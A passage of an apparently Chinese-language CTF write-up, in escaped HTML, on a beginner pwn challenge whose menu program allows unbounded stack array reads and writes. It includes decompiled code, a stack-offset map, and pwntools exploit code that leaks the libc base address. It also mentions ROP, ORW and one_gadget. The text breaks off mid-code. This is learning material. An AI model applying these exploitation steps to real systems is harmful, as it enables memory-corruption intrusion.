class=&#34;comment&#34;&gt;// [rsp+4h] [rbp-41Ch] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-418h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; num_to_write; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-414h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; nums[&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-410h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v8; &lt;span class=&#34;comment&#34;&gt;// [rsp+418h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v8 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  init();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  menu();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(nums, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(nums));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)__isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%u&amp;quot;&lt;/span&gt;, &amp;amp;choice) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( choice == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)__isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%u&amp;quot;&lt;/span&gt;, &amp;amp;idx) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;The num: %u\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)nums[idx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( choice != &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)__isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%u&amp;quot;&lt;/span&gt;, &amp;amp;idx) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Num:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)__isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%u&amp;quot;&lt;/span&gt;, &amp;amp;num_to_write) &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      nums[idx] = num_to_write;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Byebye!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		能够看到,它实现了读写栈上的一个数组的功能,但是没有设置边界,于是可以读写栈上的任意值,那可以直接修改返回地址,但是没有后门函数,(&lt;font color=&#34;red&#34;&gt;于是自己就先用rop链写system(“&amp;#x2F;bin&amp;#x2F;sh”),失败后又用了orw…越做越麻烦,其实可以直接用one_gadget的!&lt;/font&gt;)&lt;/p&gt;
&lt;h2 id=&#34;寻找返回地址和gadget&#34;&gt;&lt;a href=&#34;#寻找返回地址和gadget&#34; class=&#34;headerlink&#34; title=&#34;寻找返回地址和gadget&#34;&gt;&lt;/a&gt;寻找返回地址和gadget&lt;/h2&gt;&lt;p&gt; int nums[256]; &amp;#x2F;&amp;#x2F; [rsp+10h] [rbp-410h] BYREF&lt;/p&gt;
&lt;p&gt;现在明白在ida里面这个注释是什么意思了…就是从rsp+0x10的位置开始读nums,或者rbp-0x410的位置,这俩等价&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-0000000000000410&lt;/span&gt; nums            dd &lt;span class=&#34;number&#34;&gt;256&lt;/span&gt; dup(?)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-0000000000000010&lt;/span&gt;                 db ? ; undefined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-000000000000000F&lt;/span&gt;                 db ? ; undefined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-000000000000000&lt;/span&gt;E                 db ? ; undefined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-000000000000000&lt;/span&gt;D                 db ? ; undefined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-000000000000000&lt;/span&gt;C                 db ? ; undefined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-000000000000000B&lt;/span&gt;                 db ? ; undefined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-000000000000000&lt;/span&gt;A                 db ? ; undefined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-0000000000000009&lt;/span&gt;                 db ? ; undefined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;-0000000000000008&lt;/span&gt; var_8           dq ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+&lt;span class=&#34;number&#34;&gt;0000000000000000&lt;/span&gt;  s              db &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; dup(?)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+&lt;span class=&#34;number&#34;&gt;0000000000000008&lt;/span&gt;  r              db &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; dup(?)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+&lt;span class=&#34;number&#34;&gt;0000000000000010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+&lt;span class=&#34;number&#34;&gt;0000000000000010&lt;/span&gt; ; end of &lt;span class=&#34;built_in&#34;&gt;stack&lt;/span&gt; variables&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		num占了256个4字节的空间,总共0x400, 然后还有8字节不知道干啥的,剩下8字节是canary? 然后就是rbp和返回地址了&lt;/p&gt;
&lt;p&gt;开启了pie,下断点的时候先vmmap看一下基址,然后+ida里面的地址&lt;/p&gt;
&lt;p&gt;​		调试试试一下,所以打印258 259是canry,(注意num从0开始计数),260 261是rbp  262 263是返回地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522122710222.png&#34; alt=&#34;image-20230522122710222&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;262&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7deb083&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;263&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x7fff&lt;/span&gt;     返回地址, 同时也是lib_start_main+&lt;span class=&#34;number&#34;&gt;243&lt;/span&gt;地址,即可以算出glibc的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;270&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x55554942&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;271&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x5555&lt;/span&gt;  main的地址&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		把rsp修改成&amp;#x2F;bin&amp;#x2F;sh,然后返回地址 pop rdi, 然后system,就行了把(错了错了! ,rop的基本流程都忘了,在rop的时候rsp已经到了最后的rbp那个位置了….改上面干啥…)&lt;/p&gt;
&lt;h2 id=&#34;泄露基地址&#34;&gt;&lt;a href=&#34;#泄露基地址&#34; class=&#34;headerlink&#34; title=&#34;泄露基地址&#34;&gt;&lt;/a&gt;泄露基地址&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;262&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xf7deb083&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;263&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x7fff&lt;/span&gt;     返回地址, 同时也是lib_start_main+&lt;span class=&#34;number&#34;&gt;243&lt;/span&gt;地址,即可以算出glibc的地址&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		泄漏的地址和libc加载的地址相差是固定的,可以从ida里看,也可以调试的时候看一下,调试的时候,打印出来它的值,减去加载的地址,就得到了固定的偏移&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230522153504249.png&#34; alt=&#34;image-20230522153504249&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;readone(&lt;span class=&#34;number&#34;&gt;262&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;The num: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr1 = io.recv(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;readone(&lt;span class=&#34;number&#34;&gt;263&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;The num: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addr2 = io.recv(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr1)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#libcbase = int(addr1) - 0x240b3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## 拼接&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2)*(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)+&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr1) - &lt;span class=&#34;number&#34;&gt;0x240b3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase1 = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2)*(&lt;span class=&#34;number&#34;&gt;0b100000000000000000000000000000000&lt;/span&gt;)+&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr1) - &lt;span class=&#34;number&#34;&gt;0x240b3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase2 = (&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr2)&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;) + &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(addr1) - &lt;span class=&#34;number&#34;&gt;0x240b3&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# 注意&amp;lt;&amp;lt;优先级很低,加个括号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		io接收到的是byte流 比如b’3033882803’,并且一次是不能打印完全的,只是4字节,要两次的拼起来&lt;/p&gt;
&lt;p&gt;​		int(add2)*(2**32) 这样,或者左移32位才对,当时做题的时候好像是直接乘了100000…. 内存爆了还是溢出,报错了,应该是二进制的1000(32个0)&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;h2 id=&#34;封装函数-实现快速数据操作&#34;&gt;&lt;a href=&#34;#封装函数-实现快速数据操作&#34; class=&#34;headerlink&#34; title=&#34;封装函数,实现快速数据操作&#34;&gt;&lt;/a&gt;封装函数,实现快速数据操作&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;read1&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;The num: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    low_addr=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,drop=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 这样就可以接收到全部了,不用考虑长度,到\n截止,10进制接收&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;The num: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    high_addr=&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,drop=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; high_addr*(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;**&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;)+low_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase3 = read1(&lt;span class=&#34;number&#34;&gt;262&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;0x240b3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span 